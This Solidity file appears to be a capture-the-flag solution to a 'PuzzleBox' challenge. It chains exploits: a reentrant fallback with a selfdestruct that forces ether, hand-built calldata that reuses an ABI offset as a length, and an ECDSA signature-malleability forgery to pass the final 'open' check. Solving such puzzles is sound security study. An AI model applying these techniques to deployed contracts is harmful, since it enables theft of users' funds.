// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./PuzzleBox.sol";

contract PuzzleBoxSolution {
    function solve(PuzzleBox puzzle) external {
        // operate & drip & unlock
        _drip(puzzle);

        // creep
        puzzle.creep{gas: 96_032}();

        // zip
        _zip(puzzle);

        // torch
        _torch(puzzle);

        // spread
        _spread(puzzle);

        // open
        _open(puzzle);
    }

    function _drip(PuzzleBox puzzle) private {
        Dripper dripper = new Dripper(puzzle);
        address(dripper).call("");
    }

    function _torch(PuzzleBox puzzle) private {
        address(puzzle).call(
            hex"925facb1"
            hex"0000000000000000000000000000000000000000000000000000000000000001"
            hex"00" // reuse location param for length param
            hex"0000000000000000000000000000000000000000000000000000000000000020"
            hex"0000000000000000000000000000000000000000000000000000000000000006"
            hex"0000000000000000000000000000000000000000000000000000000000000006"
            hex"0000000000000000000000000000000000000000000000000000000000000002"
            hex"0000000000000000000000000000000000000000000000000000000000000004"
            hex"0000000000000000000000000000000000000000000000000000000000000007"
            hex"0000000000000000000000000000000000000000000000000000000000000008"
            hex"0000000000000000000000000000000000000000000000000000000000000009"
        );
    }

    function _spread(PuzzleBox puzzle) private {
        // puzzle.spread(
        //     [0x416e59DaCfDb5D457304115bBFb9089531D873B7],
        //     [0xC817dD2a5daA8f790677e399170c92AabD044b57, 0.0150e4, 0.0075e4]
        // );

        address(puzzle).call(
            hex"2b071e47"
            hex"0000000000000000000000000000000000000000000000000000000000000040"
            hex"0000000000000000000000000000000000000000000000000000000000000080"
            hex"0000000000000000000000000000000000000000000000000000000000000001"
            hex"000000000000000000000000416e59dacfdb5d457304115bbfb9089531d873b7"
            hex"0000000000000000000000000000000000000000000000000000000000000003"
            hex"000000000000000000000000c817dd2a5daa8f790677e399170c92aabd044b57"
            hex"0000000000000000000000000000000000000000000000000000000000000096"
            hex"000000000000000000000000000000000000000000000000000000000000004b"
        );
    }

    function _zip(PuzzleBox puzzle) private {
        puzzle.leak();
        puzzle.zip();
    }

    function _open(PuzzleBox puzzle) private {
        // order = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141
        // r = 0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8
        // s = 0x625cb970c2768fefafc3512a3ad9764560b330dcafe02714654fe48dd069b6df
        // v = 0x1c
        // s2 = 0x9da3468f3d897010503caed5c52689b959fbac09ff6879275a8279feffcc8a62 = (order - s)
        // v2 = 0x1b = 27 + (28 - v)

        puzzle.open(
            0xc8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8,
            (
                hex"c8f549a7e4cb7e1c60d908cc05ceff53ad731e6ea0736edf7ffeea588dfb42d8"
                hex"9da3468f3d897010503caed5c52689b959fbac09ff6879275a8279feffcc8a62"
                hex"1b"
            )
        );
    }
}

contract Dripper {
    PuzzleBox private immutable _puzzle;
    address payable private immutable _target;

    constructor(PuzzleBox puzzle) {
        _puzzle = puzzle;
        _target = payable(address(uint160(address(_puzzle)) + 2));

        // operate drip
        puzzle.operate();

        // unlock torch
        address(puzzle).call( // puzzle.lock(PuzzleBox.torch.selector, false);
            hex"deecedd4"
            hex"925facb100000000000000000000000000000000000000000000000000000000"
            hex"0000000000000000000000000000000000000000000000000000000000000000"
        ); // ??? wtf
    }

    fallback() external payable {
        // puzzle.drip{value: msg.value == 0 ? 1000 : msg.value}();
        address(_puzzle).call{value: msg.value == 0 ? 1000 : msg.value}(hex"9f678cca");
        if (msg.value == 0) selfdestruct(_target);
    }
}